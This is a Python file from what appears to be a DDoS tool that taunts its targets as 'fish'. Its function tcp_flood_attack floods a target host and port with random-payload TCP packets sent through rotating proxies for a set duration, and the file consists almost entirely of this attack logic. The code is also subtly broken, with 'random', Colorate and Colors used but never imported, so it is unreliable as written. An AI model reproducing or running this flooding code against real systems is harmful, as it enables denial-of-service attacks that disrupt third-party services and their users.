import socket
import time
import pystyle
from utils.client_utils import TcpClient
from utils.random_utils import random_string

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

def tcp_flood_attack(target, proxies, duration, packet_size, packet_delay):
    host, port = target.split(":")
    port = int(port)
    end_time = time.time() + duration
    while time.time() < end_time:
        proxy = random.choice(proxies)
        sock = TcpClient.create_socket(proxy)
        try:
            payload = random_string(packet_size * 1024)  
            sock.connect((host, port))
            sock.send(payload.encode())
            successsend = f"🦈 Shark sent TCP packet on fish: {host}:{port} by using proxy: {proxy['host']}:{proxy['port']}"
            print(Colorate.Horizontal(Colors.blue_to_white, (successsend)))
        except Exception as e:
            errorsend = f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: "
            print(Colorate.Horizontal(Colors.blue_to_white, (errorsend)))
        finally:
            sock.close()
        time.sleep(packet_delay / 1000)  
